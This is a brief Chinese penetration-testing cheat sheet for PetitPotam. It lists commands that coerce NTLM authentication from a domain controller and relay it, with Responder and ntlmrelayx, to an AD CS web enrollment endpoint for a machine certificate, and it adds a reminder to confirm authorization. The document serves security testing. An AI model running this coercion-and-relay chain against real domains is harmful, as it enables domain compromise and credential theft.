# PetitPotam 使用

PetitPotam 用于验证 EFSRPC 相关强制认证路径。它经常和 AD CS、NTLM 中继防护检查放在同一组测试里。

## 基础验证

```bash
python3 PetitPotam.py 192.168.1.50 192.168.1.10
```

```bash
python3 PetitPotam.py -u user -p pass -d domain.local 192.168.1.50 192.168.1.10
```

```bash
python3 PetitPotam.py -u user -p pass -d domain.local -pipe all 192.168.1.50 192.168.1.10
```

## 配合监听

```bash
sudo responder -I eth0 -A
```

```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template Machine
```

```bash
python3 PetitPotam.py -u user -p pass -d domain.local 192.168.1.50 dc01.domain.local
```

验证前确认授权范围和监听地址。记录时把触发方法、目标主机、认证方向和 AD CS 配置状态放在一起。
